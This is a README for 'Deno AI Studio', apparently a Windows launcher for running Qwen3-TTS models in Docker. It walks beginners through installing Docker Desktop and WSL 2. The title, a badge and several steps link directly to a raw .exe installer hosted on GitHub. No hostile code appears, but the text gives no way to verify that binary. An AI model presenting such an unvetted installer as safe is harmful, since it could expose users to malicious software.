# [Deno AI Studio](https://raw.githubusercontent.com/Deno2026/Deno-AI-Studio/main/deno-ai-studio/updates/windows-x64/Deno%20AI%20Studio%20Setup%200.1.3.exe)

[![STEP 1 Install Docker Desktop](https://img.shields.io/badge/STEP%201-Install%20Docker%20Desktop-2496ED?style=for-the-badge&logo=docker&logoColor=white)](https://docs.docker.com/desktop/setup/install/windows-install/)
[![STEP 2 Install WSL 2](https://img.shields.io/badge/STEP%202-Install%20WSL%202-4F46E5?style=for-the-badge&logo=windows-terminal&logoColor=white)](https://learn.microsoft.com/en-us/windows/wsl/install)
[![STEP 3 Download Deno AI Studio](https://img.shields.io/badge/STEP%203-Download%20Deno%20AI%20Studio-16A34A?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Deno2026/Deno-AI-Studio/main/deno-ai-studio/updates/windows-x64/Deno%20AI%20Studio%20Setup%200.1.3.exe)

## Screenshots

| Home / Catalog | Model workspace | Settings |
| --- | --- | --- |
| ![Home](deno-ai-studio/assets/home.png) | ![Detail](deno-ai-studio/assets/detail.png) | ![Settings](deno-ai-studio/assets/settings.png) |

## Quick start

| Step | What to click | Why |
| --- | --- | --- |
| 1 | [Install Docker Desktop](https://docs.docker.com/desktop/setup/install/windows-install/) | Required helper app for isolated model execution |
| 2 | [Install WSL 2](https://learn.microsoft.com/en-us/windows/wsl/install) | Required Windows backend for Docker Desktop |
| 3 | [Download Deno AI Studio](https://raw.githubusercontent.com/Deno2026/Deno-AI-Studio/main/deno-ai-studio/updates/windows-x64/Deno%20AI%20Studio%20Setup%200.1.3.exe) | Windows installer for the launcher |

## Beginner install guide

If this is your first time, use this exact order:

1. Install Docker Desktop
2. Install WSL 2
3. Download and install Deno AI Studio
4. Open Docker Desktop once
5. Open Deno AI Studio and install your first model

This repository hosts the public Windows installer and update manifest for **Deno AI Studio**.

## Before you install

### Required helper apps

- [Download Docker Desktop for Windows](https://docs.docker.com/desktop/setup/install/windows-install/)
- [Install WSL on Windows](https://learn.microsoft.com/en-us/windows/wsl/install)

### Which Docker file should I download?

Most users should download:

- **Docker Desktop for Windows - x86_64**

That is the correct version for almost all normal Intel and AMD Windows PCs.

Do **not** choose the Arm version unless you know your PC is a Windows-on-Arm device.

### Why this is needed

Deno AI Studio runs AI models inside an isolated container environment.

That means:

- it helps keep your main Windows environment cleaner
- it avoids many dependency conflicts between AI projects
- it reduces the chance of breaking your existing PC setup
- it makes install, update, and cleanup much safer

If you are new to Docker, the easiest way to think about it is:

**Docker Desktop is a required helper app that lets Deno AI Studio run models safely in a separate workspace without directly mixing everything into your main PC environment.**

### Do I need WSL too?

Yes, Deno AI Studio uses Docker Desktop on Windows, and Docker Desktop works best with the **WSL 2 backend**.

The good news is:

- most beginners can start with **Docker Desktop first**
- if WSL is missing, Docker Desktop or Windows usually tells you what to do next
- if that happens, just use the WSL link above, finish that step, and continue

### Easiest WSL 2 install method

1. Click the **Windows Start button**
2. Type **PowerShell**
3. Right-click **Windows PowerShell**
4. Click **Run as administrator**
5. If Windows asks for permission, click **Yes**
6. Run this command:

```powershell
wsl --install
```

7. Wait for Windows to finish the setup
8. Restart Windows if asked
9. After restarting, open Docker Desktop again

If `wsl --install` says WSL is already installed, you can continue to the next step.

## Step-by-step for first-time users

### Part 1. Install Docker Desktop

1. Click [Install Docker Desktop](https://docs.docker.com/desktop/setup/install/windows-install/).
2. On the Docker page, download **Docker Desktop for Windows - x86_64**.
3. Wait for the file to finish downloading.
4. Double-click `Docker Desktop Installer.exe`.
5. If Windows asks for permission, click **Yes**.
6. When the installer opens, keep the default settings.
7. If you see an option related to **Use WSL 2**, keep it enabled.
8. Continue until the Docker installation finishes.

### Part 2. Install WSL 2

1. Click [Install WSL 2](https://learn.microsoft.com/en-us/windows/wsl/install/) if you have not done it already.
2. Open **PowerShell as Administrator**:
   - click the **Windows Start button**
   - type **PowerShell**
   - right-click **Windows PowerShell**
   - click **Run as administrator**
3. In PowerShell, run:

```powershell
wsl --install
```

4. Wait for Windows to finish installing WSL.
5. Restart Windows if asked.

### Part 3. Start Docker Desktop once

1. Open **Docker Desktop** from the Start menu.
2. If Docker asks you to accept terms, click **Accept**.
3. Wait until Docker finishes loading normally.
4. Do not continue until Docker is fully open and no longer shows a startup/loading state.

### Part 4. Install Deno AI Studio

1. Click [Download Deno AI Studio](https://raw.githubusercontent.com/Deno2026/Deno-AI-Studio/main/deno-ai-studio/updates/windows-x64/Deno%20AI%20Studio%20Setup%200.1.3.exe).
2. Run `Deno AI Studio Setup 0.1.3.exe`.
3. Finish the installer.
4. Open **Deno AI Studio** from the desktop or Start menu.
5. Choose your language from the top-left language menu.

### Part 5. Install and run your first model

1. Pick a model from the catalog and click **Start**.
2. If this is your first time with that model, click **Install** and wait for the setup to finish.
3. Add input files only if the selected model requires them.
4. Click **Run**.
5. Open the output folder from inside the app when the run is finished.

## What it is

Deno AI Studio is a Windows desktop launcher for open-source AI workflows.  
It is designed to make model installation, execution, input-file handling, and cleanup easier without relying on a terminal-first flow.

## Current included model support

- Qwen3-TTS 0.6B
- Qwen3-TTS 1.7B

## Notes

- Docker Desktop and WSL are required.
- Some models may require Hugging Face access approval or login.
- The app checks this repository for future installer updates.
